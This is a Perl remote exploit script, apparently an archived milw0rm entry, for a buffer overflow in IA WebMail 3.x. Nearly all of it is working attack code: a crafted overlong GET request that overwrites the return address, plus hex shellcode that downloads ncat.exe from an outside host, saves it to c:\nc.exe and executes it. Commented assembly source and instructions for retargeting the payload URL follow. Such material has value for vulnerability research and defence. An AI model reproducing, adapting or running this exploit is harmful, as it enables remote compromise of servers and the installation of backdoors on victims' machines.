#!/usr/bin/perl -w
#
# IA WebMail 3.x (iaregdll.dll version 1.0.0.5) Remote Exploit
# Application Specific Shellcode: URL Downloader
#  - www elitehaven net/ncat.exe (downloaded)
#  - c:\nc.exe                          (created)
#
# By Peter Winter-Smith peter4020 hotmail com
# Shellcode included - will need reassembling to use different
# urls and files etc.
#
# Tested against:
#  - Windows XP Home SP1
#  - Windows 2000 Pro SP4
#
# Shellcode should work each time, since it steals it's addresses
# from the iaregdll.dll module import tables.
# Uses a very static jmp esp in iaregdll.dll - Should work on all
# servers without alteration!
#
# If the remote server is running a firewall, the urldownloader
# will be unable to spawn a shell, so for testing I recommend
# that you close the firewalls, or get another shellcode which
# will deal with this. This exploit is for PoC purposes only :o)
#
# Notes:
#  - WebMailsvr.exe exits without consuming 100% resources in most
#    cases.
#  - This has only been tested with IA WebMail 3.1, however it was
#    designed to exploit all versions.



use IO::Socket;

if(!($ARGV[1]))
{
 print "Usage: iawebmail.pl <victim> <port>\n\n";
 exit;
}

$shellcode =            "\x90\xEB\x3C\x5F\x55\x89\xE5\x81" .
                        "\xC4\xE8\xFF\xFF\xFF\x57\x31\xDB" .
                        "\xB3\x07\xB0\xFF\xFC\xF2\xAE\xFE" .
                        "\x47\xFF\xFE\xCB\x80\xFB\x01\x75" .
                        "\xF4\x5F\x57\x8D\x7F\x0B\x57\x8D" .
                        "\x7F\x13\x57\x8D\x7F\x08\x57\x8D" .
                        "\x7F\x23\x57\x8D\x7F\x09\x47\x57" .
                        "\x8D\x54\x24\x14\x52\xEB\x02\xEB" .
                        "\x52\x89\xD6\xFF\x36\xFF\x15\xDC" .
                        "\x51\x02\x10\x5A\x52\x8D\x72\xFC" .
                        "\xFF\x36\x50\xFF\x15\x14\x52\x02" .
                        "\x10\x5A\x52\x31\xC9\x51\x51\x8D" .
                        "\x72\xF0\xFF\x36\x8D\x72\xF4\xFF" .
                        "\x36\x51\xFF\xD0\x5A\x52\xFF\x72" .
                        "\xEC\xFF\x15\xDC\x51\x02\x10\x5A" .
                        "\x52\x8D\x72\xF8\xFF\x36\x50\xFF" .
                        "\x15\x14\x52\x02\x10\x5A\x52\x31" .
                        "\xC9\x41\x51\x8D\x72\xF0\xFF\x36" .
                        "\xFF\xD0\xCC\xE8\x6B\xFF\xFF\xFF" .
                        "\x55\x52\x4C\x4D\x4F\x4E\x2E\x44" .
                        "\x4C\x4C\xFF\x55\x52\x4C\x44\x6F" .
                        "\x77\x6E\x6C\x6F\x61\x64\x54\x6F" .
                        "\x46\x69\x6C\x65\x41\xFF\x57\x69" .
                        "\x6E\x45\x78\x65\x63\xFF\x68\x74" .
                        "\x74\x70\x3A\x2F\x2F\x77\x77\x77" .
                        "\x2E\x65\x6C\x69\x74\x65\x68\x61" .
                        "\x76\x65\x6E\x2E\x6E\x65\x74\x2F" .
                        "\x6E\x63\x61\x74\x2E\x65\x78\x65" .
                        "\xFF\x63\x3A\x5C\x6E\x63\x2E\x65" .
                        "\x78\x65\xFF\x6B\x65\x72\x6E\x65" .
                        "\x6C\x33\x32\x2E\x64\x6C\x6C\xFF";

$victim = IO::Socket::INET->new(Proto=>'tcp',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die "Unable to connect to $ARGV[0] on port $ARGV[1]";
$ebp = "BBBB";
$eip = "\x33\xBD\x02\x10";
$exploit = "GET /" . "a"x1036 . $ebp . $eip . $shellcode . " HTTP/1.1\n\n";

print $victim $exploit;

print " + Malicious GET request sent ...\n";
print " + Wait a moment now, then connect to $ARGV[0] on port 9999.\n";

sleep(5);

print "Done.\n";

close($victim);
exit;

########################################
##                            SHELLCODE                              #
########################################
# ; IA WebMail 3.x Shellcode (iaregdll.dll version 1.0.0.5)
# ; Url Download + Execute
# ; By Peter Winter-Smith
# ; [peter4020@hotmail.com]
# ;
# ; nasmw -fbin -o iashellcode.s iashellcode.asm
#
# bits 32
# 
# int3
# jmp short killnull
# 
# next:
# pop edi
# 
# push ebp
# mov ebp, esp
# add esp, -24
# 
# push edi
# 
# xor ebx, ebx
# mov bl, 07h
# mov al, 0ffh
# 
# cld
# nullify:
# repne scasb
# inc byte [edi-01h]
# dec bl
# cmp bl, 01h
# jne nullify
# 
# pop edi
# 
# push edi		; 'URLMON.DLL'
# lea edi, [edi+11]
# push edi		; 'URLDownloadToFileA'
# lea edi, [edi+19]
# push edi		; 'WinExec'
# lea edi, [edi+08]
# push edi		; 'http://www.elitehaven.net/ncat.exe'
# lea edi, [edi+35]
# push edi		; 'c:\nc.exe'
# lea edi, [edi+09]
# inc edi
# push edi		; 'kernel32.dll'
# 
# lea edx, [esp+20]
# push edx
# 
# jmp short over
# killnull:
# jmp short data
# over:
# 
# mov esi, edx
# push dword [esi]
# 
# call [100251DCh]	; LoadLibraryA
# 
# pop edx
# push edx
# lea esi, [edx-04]
# push dword [esi]
# 
# push eax
# 
# call [10025214h]	; GetProcAddress(URLMON.DLL, URLDownloadToFileA);
# 
# pop edx
# push edx
# 
# xor ecx, ecx
# push ecx
# push ecx
# lea esi, [edx-16]	; file path
# push dword [esi]
# lea esi, [edx-12]	; url
# push dword [esi]
# push ecx
# 
# call eax
# 
# pop edx
# push edx
# 
# push dword [edx-20]
# 
# call [100251DCh]	; LoadLibraryA
# 
# pop edx
# push edx
# 
# 
# lea esi, [edx-08]
# push dword [esi]	; 'WinExec'
# push eax		; kernel32.dll handle
# 
# call [10025214h]	; GetProcAddress(kernel32.dll, WinExec);
# 
# pop edx
# push edx
# 
# xor ecx, ecx
# inc ecx
# push ecx
# 
# lea esi, [edx-16]	; file path
# push dword [esi]
# 
# call eax
# 
# int3
# 
# 
# data:
# call next
# db 'URLMON.DLL',0ffh
# db 'URLDownloadToFileA',0ffh
# db 'WinExec',0ffh
# db 'http://www.elitehaven.net/ncat.exe',0ffh
# ; When altering, you MUST be sure
# ; to also alter the offsets in the 0ffh to null
# ; byte search!
# ; for example:
# ;   db 'http://www.site.com/someguy/trojan.exe',0ffh
# ; count the length of the url, and add one for the 0ffh byte.
# ; The above url is 38 bytes long, plus one for our null, is 39 bytes.
# ; find the code saying (at the start of the shellcode):
# ;   push edi		; 'http://www.elitehaven.net/ncat.exe'
# ;   lea edi, [edi+35]
# ; and make it:
# ;   push edi		; 'http://www.site.com/someguy/trojan.exe'
# ;   lea edi, [edi+39]
# ; same goes for the filename below :o)
# db 'c:\nc.exe',0ffh
# db 'kernel32.dll',0ffh
#####################################################################

# milw0rm.com [2003-11-19]
